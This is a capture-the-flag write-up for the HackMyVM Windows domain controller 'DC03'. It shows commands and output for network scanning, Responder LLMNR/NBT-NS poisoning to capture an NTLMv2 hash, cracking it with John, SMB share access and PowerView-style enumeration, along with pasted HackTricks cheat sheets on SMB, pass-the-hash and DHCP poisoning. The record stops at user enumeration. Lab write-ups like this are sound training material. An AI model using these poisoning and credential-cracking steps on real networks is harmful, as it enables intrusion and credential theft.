# CTF Penetration Testing

## HackMyVM

### DC03 - Machine

- Machine name: [DC03](https://hackmyvm.eu/machines/machine.php?vm=DC03)
- Machine type: Windows VM <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/dc03.png" alt="DC03 Machine Logo" width="150"/>

#### Tools Used

- bloodyAD
- CrackMapExec
- Evil-WinRM
- impacket-changepasswd
- John the Ripper
- LDAPDomainDump
- ldapsearch
- Nmap
- PywerView
- Responder
- smbclient

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:a3:5b:eb:16  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 4  bytes 1830 (1.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 2665 (2.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::b8a4:ba37:17c5:3d73  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6e:4c:1d  txqueuelen 1000  (Ethernet)
        RX packets 42  bytes 7246 (7.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 4180 (4.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.102
192.168.56.126 ←
```

`nmap -Pn -sS -sV -p- -T4 192.168.56.126`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 08:57 EDT
Nmap scan report for 192.168.56.126
Host is up (0.0011s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-05 21:58:41Z) ←
135/tcp   open  msrpc         Microsoft Windows RPC ←
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name) ←
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:68:4D:C0 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.44 seconds
```

`nmap -Pn -sS --script=smb-protocols -p445 192.168.56.126`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 08:57 EDT
Nmap scan report for 192.168.56.126
Host is up (0.0014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:68:4D:C0 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-protocols: ←
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

`nmap -Pn -sS --script=smb2-security-mode -p445 192.168.56.126`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 08:57 EDT
Nmap scan report for 192.168.56.126
Host is up (0.0045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:68:4D:C0 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required ←

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

<🔄 Alternative Step>

`crackmapexec smb 192.168.56.126`:
```
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) ←
```

</🔄 Alternative Step>

`echo -e '192.168.56.126\tDC01.SOUPEDECODE.LOCAL' | tee -a /etc/hosts`:
```
192.168.56.126  DC01.SOUPEDECODE.LOCAL ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#Possible Credentials**]

|   |   |
|---|---|
|**Username(s)**|**Common passwords**|
|_(blank)_|_(blank)_|
|guest|_(blank)_|
|Administrator, admin|_(blank)_, password, administrator, admin|
|arcserve|arcserve, backup|
|tivoli, tmersrvd|tivoli, tmersrvd, admin|
|backupexec, backup|backupexec, backup, arcada|
|test, lab, demo|password, test, lab, demo|

[**#Obtain Information**]

```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password
```

[**#List shared folders**]

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<❌ Failed Step>

`smbclient --no-pass -L 192.168.56.126`:
```
session setup failed: NT_STATUS_ACCESS_DENIED ←
```

</❌ Failed Step>

`nmap -Pn -sS --script=ldap-rootdse -p389 192.168.56.126`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 08:58 CEST
Nmap scan report for 192.168.56.126
Host is up (0.00050s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL ←
|       ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 61460
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       dnsHostName: DC01.SOUPEDECODE.LOCAL
|       defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
|       currentTime: 20241023001939.0Z
|_      configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
MAC Address: 08:00:27:68:4D:C0 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#capturing-credentials-with-responder)

[**#Responder for Protocol Poisoning**]

**Responder** is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services.
It comes pre-installed in Kali Linux, configurable at `/etc/responder/Responder.conf`.
Responder displays captured hashes on the screen and saves them in the `/usr/share/responder/logs` directory.
It supports both IPv4 and IPv6.
Windows version of Responder is available [here](https://github.com/lgandx/Responder-Windows).   

**Running Responder**

To run Responder with default settings: `responder -I <Interface>`
For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v` 
Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`

[**#DHCP Poisoning with Responder**]

Spoofing DHCP responses can permanently poison a victim's routing information, offering a stealthier alternative to ARP poisoning.
It requires precise knowledge of the target network's configuration.
Running the attack: `./Responder.py -I eth0 -Pdv`
This method can effectively capture NTLMv1/2 hashes, but it requires careful handling to avoid network disruption.

[**#Capturing Credentials with Responder**]

Responder will impersonate services using the above-mentioned protocols, capturing credentials (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the spoofed services.  
Attempts can be made to downgrade to NetNTLMv1 or disable ESS for easier credential cracking. 

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`responder -I eth1 -v`:
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth1]
    Responder IP               [192.168.56.101]
    Responder IPv6             [fe80::b8a4:ba37:17c5:3d73]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-KNHBOWY0SWU]
    Responder Domain Name      [MCAH.LOCAL]
    Responder DCE-RPC Port     [48363]

[+] Listening for events...                                                                  
[!] Error starting TCP server on port 389, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[*] [NBT-NS] Poisoned answer sent to 192.168.56.126 for name FILESERVER (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[*] [MDNS] Poisoned answer sent to fe80::7907:e000:3dc0:150c for name FileServer.local
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to fe80::7907:e000:3dc0:150c for name FileServer
[*] [MDNS] Poisoned answer sent to fe80::7907:e000:3dc0:150c for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[*] [LLMNR]  Poisoned answer sent to fe80::7907:e000:3dc0:150c for name FileServer
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[SMB] NTLMv2-SSP Client   : fe80::7907:e000:3dc0:150c
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash ←   : xkate578::soupedecode:93ecae2abe074778:7501D3013A54D0EA10091E8108515382:0101000000000000800D47A527EBDA0125CD8524AED1896E00000000020008005A0033003900300001001E00570049004E002D004200560047003900380051003800380052005A00390004003400570049004E002D004200560047003900380051003800380052005A0039002E005A003300390030002E004C004F00430041004C00030014005A003300390030002E004C004F00430041004C00050014005A003300390030002E004C004F00430041004C0007000800800D47A527EBDA010600040002000000080030003000000000000000000000000040000093EA6948F41DAF3AE595EE52C88203A83586C0827B7384EB5EE13F41E11986040A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000 ←
```

`vim ./user_hash.txt`:
```
xkate578::soupedecode:93ecae2abe074778:7501D3013A54D0EA10091E8108515382:0101000000000000800D47A527EBDA0125CD8524AED1896E00000000020008005A0033003900300001001E00570049004E002D004200560047003900380051003800380052005A00390004003400570049004E002D004200560047003900380051003800380052005A0039002E005A003300390030002E004C004F00430041004C00030014005A003300390030002E004C004F00430041004C00050014005A003300390030002E004C004F00430041004C0007000800800D47A527EBDA010600040002000000080030003000000000000000000000000040000093EA6948F41DAF3AE595EE52C88203A83586C0827B7384EB5EE13F41E11986040A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./user_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jesuschrist      (xkate578) ← 
1g 0:00:00:00 DONE (2024-09-05 10:11) 20.00g/s 20480p/s 20480c/s 20480C/s 123456..bethany
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

`crackmapexec smb 192.168.56.126 -d 'SOUPEDECODE.LOCAL' -u 'xkate578' -p 'jesuschrist' --shares`:
```
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist 
SMB         192.168.56.126  445    DC01             [+] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin                                                                                          
SMB         192.168.56.126  445    DC01             C$                              Default share                                                                                         
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC                                                                                            
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share                                                                                    
SMB         192.168.56.126  445    DC01             share           READ,WRITE ←     
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share                                                                
```

`smbclient -U 'xkate578' --password='jesuschrist' //192.168.56.126/share`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Sep  5 19:23:36 2024
  ..                                  D        0  Thu Aug  1 01:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024
  user.txt                            A       70  Thu Aug  1 01:39:25 2024 ←

                12942591 blocks of size 4096. 10932313 blocks available
smb: \> get user.txt ←
getting file \user.txt of size 70 as user.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> exit
```

`cat ./user.txt`:
```
12f54*************************** ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[5985,5986 - Pentesting WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

[**#Using evil-winrm**]

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

Pass the hash with evil-winrm:
```
evil-winrm -u <username> -H <Hash> -i <IP>
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<❌ Failed Step>

`evil-winrm -i 192.168.56.126 -u 'xkate578' -p 'jesuschrist'`:
```                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError ←
                                        
Error: Exiting with code 1
```

</❌ Failed Step>

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[PowerView/SharpView](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

[**#Users, Groups, Computers & OUs**]

```shell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup 
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`pywerview get-netuser -w 'SOUPEDECODE.LOCAL' -u 'xkate578' -p 'jesuschrist' --dc-ip 192.168.56.126 --username 'xkate578'`:
```
objectclass:           top, person, organizationalPerson, user
cn:                    Xenia Kate
sn:                    Kate
l:                     Springfield
st:                    NY
title:                 Analyst
description:           Adventure seeker and extreme sports fan
postalcode:            81335
telephonenumber:       719-5053
givenname:             Xenia
initials:              XK
distinguishedname:     CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL
instancetype:          4
whencreated:           2024-06-15 20:04:39+00:00
whenchanged:           2024-09-07 19:28:26+00:00
displayname:           Xenia Kate
usncreated:            16902
memberof:              CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL ←
usnchanged:            53265
department:            Sales
company:               CompanyC
streetaddress:         123 Elm St
name:                  Xenia Kate
objectguid:            {f5dee86d-8f4e-4591-8446-0250d6e4bf92}
useraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
badpwdcount:           0
codepage:              0
countrycode:           0
badpasswordtime:       1601-01-01 00:00:00+00:00
lastlogoff:            1601-01-01 00:00:00+00:00
lastlogon:             2024-08-01 06:05:02.099560+00:00
logonhours:            ffffffffffffffffffffffffffffffffffffffffff...
pwdlastset:            2024-08-01 05:37:18.874022+00:00
primarygroupid:        513
objectsid:             S-1-5-21-2986980474-46765180-2505414164-1182
admincount:            1
accountexpires:        1601-01-01 00:00:00+00:00
logoncount:            5
samaccountname:        xkate578
samaccounttype:        805306368
userprincipalname:     xkate578@soupedecode.local
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
